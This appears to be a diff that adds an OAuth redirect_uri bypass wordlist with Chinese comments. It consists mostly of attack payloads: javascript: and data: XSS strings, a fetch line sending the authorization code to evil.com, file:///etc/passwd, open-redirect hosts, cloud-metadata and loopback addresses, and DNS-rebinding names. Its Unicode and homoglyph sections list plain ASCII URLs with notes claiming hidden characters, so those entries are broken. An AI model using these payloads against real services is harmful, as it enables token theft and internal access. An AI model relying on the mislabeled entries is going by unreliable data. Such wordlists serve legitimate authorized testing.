@@ -1,0 +1,173 @@
+# OAuth Redirect URI - Protocol Bypass Attack Dictionary
+# 协议绕过攻击模式 - 利用不同协议绕过redirect_uri验证
+# 用于测试目标是否正确验证redirect_uri的协议部分
+
+# HTTP协议替换（HTTPS -> HTTP）
+http://target.com/callback
+http://target.com/oauth/callback
+http://target.com/auth/callback
+http://target.com/api/callback
+http://target.com/login/callback
+
+# 自定义协议
+custom://target.com/callback
+myapp://target.com/callback
+oauth://target.com/callback
+auth://target.com/callback
+app://target.com/callback
+redirect://target.com/callback
+callback://target.com/callback
+token://target.com/callback
+
+# 移动端协议
+android-app://target.com/callback
+ios-app://target.com/callback
+mobile://target.com/callback
+app-scheme://target.com/callback
+deep-link://target.com/callback
+intent://target.com/callback
+
+# 桌面应用协议
+desktop://target.com/callback
+electron://target.com/callback
+nwjs://target.com/callback
+tauri://target.com/callback
+neutralino://target.com/callback
+
+# 文件协议
+file:///etc/passwd
+file:///tmp/callback
+file:///var/www/callback
+file://localhost/callback
+file://127.0.0.1/callback
+
+# 数据协议
+data:text/html,<script>alert(1)</script>
+data:text/html,<img src=x onerror=alert(1)>
+data:application/json,{"code":"123"}
+data:application/x-www-form-urlencoded,code=123&state=abc
+
+# JavaScript协议
+javascript:alert(1)
+javascript:document.location='https://evil.com'
+javascript:fetch('https://evil.com?code='+document.location.search)
+javascript:window.location='https://evil.com'
+
+# VBScript协议（IE特定）
+vbscript:MsgBox(1)
+
+# 协议相对URL
+//target.com/callback
+//evil.com/callback
+//attacker.com/callback
+
+# 协议混淆
+hTtP://target.com/callback
+HtTp://target.com/callback
+HTTP://target.com/callback
+hTTp://target.com/callback
+HttPs://target.com/callback
+hTtPs://target.com/callback
+
+# 协议+空格混淆
+http ://target.com/callback
+http:// target.com/callback
+http://target.com /callback
+
+# 协议+换行混淆
+http
+://target.com/callback
+http://
+target.com/callback
+
+# 协议+Tab混淆
+http\t://target.com/callback
+http://\ttarget.com/callback
+
+# 协议+空字节
+http%00://target.com/callback
+http://%00target.com/callback
+http://target.com%00/callback
+
+# 协议+注释
+http(/* comment */)//target.com/callback
+http://target.com(/* comment */)/callback
+
+# 协议+特殊字符
+http://target.com/callback?code=123#token=abc
+http://target.com/callback?code=123&state=abc
+http://target.com/callback?code=123;state=abc
+http://target.com/callback?code=123,state=abc
+
+# 协议+认证信息
+http://user:pass@target.com/callback
+http://admin:admin@target.com/callback
+http://oauth:secret@target.com/callback
+
+# 协议+端口
+http://target.com:80/callback
+http://target.com:8080/callback
+http://target.com:3000/callback
+http://target.com:443/callback
+https://target.com:80/callback
+https://target.com:8080/callback
+
+# 协议+IPv6
+http://[::1]/callback
+http://[0:0:0:0:0:0:0:1]/callback
+https://[::1]/callback
+http://[2001:db8::1]/callback
+
+# 协议+IPv4变体
+http://127.0.0.1/callback
+http://0x7f000001/callback
+http://2130706433/callback
+http://0177.0.0.1/callback
+http://0x7f.0.0.1/callback
+http://127.1/callback
+http://0/callback
+
+# 协议+本地地址
+http://localhost/callback
+http://127.0.0.1/callback
+http://0.0.0.0/callback
+http://[::]/callback
+http://[::1]/callback
+
+# 协议+内网地址
+http://10.0.0.1/callback
+http://10.0.0.2/callback
+http://172.16.0.1/callback
+http://192.168.0.1/callback
+http://192.168.1.1/callback
+http://169.254.169.254/callback
+
+# 协议+DNS重绑定
+http://rebind-127.0.0.1-evil.com/callback
+http://rebind-10.0.0.1-evil.com/callback
+http://rebind-192.168.1.1-evil.com/callback
+
+# 协议+Unicode混淆
+http://target.com/callback
+http://target.com/callback
+http://target.com/callback
+
+# 协议+IDN同形异义
+http://target.com/callback (使用西里尔字母а)
+http://target.com/callback (使用希腊字母ο)
+http://target.com/callback (使用拉丁字母扩展)
+
+# 协议+空白字符
+http://target.com/callback (U+00A0)
+http://target.com/callback (U+2003)
+http://target.com/callback (U+3000)
+
+# 协议+控制字符
+http://target.com/callback (U+0001)
+http://target.com/callback (U+0002)
+http://target.com/callback (U+0003)
+
+# 协议+组合字符
+http://target.com/callback (U+0300)
+http://target.com/callback (U+0301)
+http://target.com/callback (U+0302)
